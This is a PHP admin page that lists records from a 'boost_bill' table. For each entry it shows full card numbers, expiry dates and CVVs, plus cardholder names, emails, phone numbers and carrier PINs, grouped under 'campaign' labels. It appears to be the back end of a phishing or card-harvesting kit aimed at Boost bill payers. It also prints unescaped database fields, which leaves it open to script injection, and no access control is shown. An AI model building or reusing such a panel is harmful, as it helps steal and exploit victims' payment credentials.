<?php
require_once 'config.php';

$query = $con->query("SELECT * FROM boost_bill");
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.7/css/dataTables.bootstrap5.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/responsive/2.5.0/css/responsive.bootstrap5.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="css/sweetalert2.min.css">
    <title>Users list</title>
</head>

<body>
    <div class="container my-5">
        <div class="row">
            <div class="col-12">
                <table id="example" class="table table-bordered text-center align-middle table-striped" style="width:100%">
                    <thead>
                        <tr>
                            <th>SN</th>
                            <th>Date</th>
                            <th>Campaign</th>
                            <th>Customer Details</th>
                            <th>Phone Number</th>
                            <th>Card Number</th>
                            <th>Status</th>
                            <th>Notes</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php while ($row = mysqli_fetch_object($query)) :
                            $month = date('n', mktime(0, 0, 0, $row->cardMonth, 10));
                            $month = sprintf('%02d', $month);
                            $status = $row->status;
                        ?>
                            <tr>
                                <td><?= $row->id ?></td>
                                <td><?= date('d-m-Y', strtotime($row->date)) ?></td>
                                <td><?= $row->campaign ?></td>
                                <td>
                                    <h6>name: <?= $row->cardHolderName ?></h6>
                                    <h6>email: <?= $row->email ?></h6>
                                </td>
                                <td>
                                    <h6><?= $row->cellNumber ?></h6>
                                    <h6>pin code: <?= $row->boostPin ?></h6>
                                    <h6>amount due: $<?= ($row->amount + $processingFee) ?></h6>
                                </td>
                                <td>
                                    <h6><?= $row->cardNumber ?></h6>
                                    <h6>Expiry: <?= $month . '/' . $row->cardYear ?></h6>
                                    <h6>Cvv: <?= $row->cvv ?></h6>
                                </td>
                                <td>
                                    <?php if ($status == 'Pending') : ?>
                                        <span class="btn btn-secondary">pending</span>
                                    <?php elseif ($status == 'Cancelled') : ?>
                                        <span class="btn btn-danger">cancelled</span>
                                    <?php else : ?>
                                        <span class="btn btn-success">completed</span>
                                    <?php endif; ?>
                                </td>
                                <td><?= nl2br($row->notes) ?></td>
                                <td>
                                    <a href="edit.php?id=<?= $row->id ?>" class="btn btn-edit btn-sm btn-primary" data-id="<?= $row->id ?>"><i class="fas fa-pencil"></i></a>
                                    <a href="#!" class="btn btn-del btn-sm btn-danger" data-id="<?= $row->id ?>"><i class="fas fa-trash"></i></a>
                                </td>
                            </tr>
                        <?php endwhile; ?>
                    </tbody>
                    <tfoot>
                        <tr>
                            <th>SN</th>
                            <th>Date</th>
                            <th>Campaign</th>
                            <th>Customer Details</th>
                            <th>Phone Number</th>
                            <th>Card Number</th>
                            <th>Status</th>
                            <th>Notes</th>
                            <th>Action</th>
                        </tr>
                    </tfoot>
                </table>
            </div>
        </div>
    </div>



    <script src="https://code.jquery.com/jquery-3.7.0.js"></script>
    <script src="https://cdn.datatables.net/1.13.7/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.7/js/dataTables.bootstrap5.min.js"></script>
    <script src="https://cdn.datatables.net/responsive/2.5.0/js/dataTables.responsive.min.js"></script>
    <script src="https://cdn.datatables.net/responsive/2.5.0/js/responsive.bootstrap5.min.js"></script>
    <script src="js/sweetalert2.min.js"></script>
    <script>
        $(document).ready(function() {
            new DataTable('#example', {
                responsive: true,
                columnDefs: [{
                    width: '12%',
                    target: 7
                }],
                order: [
                    [0, 'desc']
                ]
            });
            $(document).on('click', '#example .btn-del', function(e) {
                e.preventDefault();
                let id = $(this).data('id');

                $.ajax({
                    url: 'del.php',
                    method: 'post',
                    data: {
                        del: id
                    },
                    success: function(result) {
                        Swal.fire({
                            icon: "success",
                            title: result,
                            showConfirmButton: false
                        });
                        setTimeout(() => {
                            window.location.href = "/clientarea/records.php";
                        }, 1800);
                    },
                    error: function(err) {
                        Swal.fire({
                            icon: "error",
                            title: err.status,
                            showConfirmButton: false
                        });
                    }
                })
            });

        })
    </script>
</body>

</html>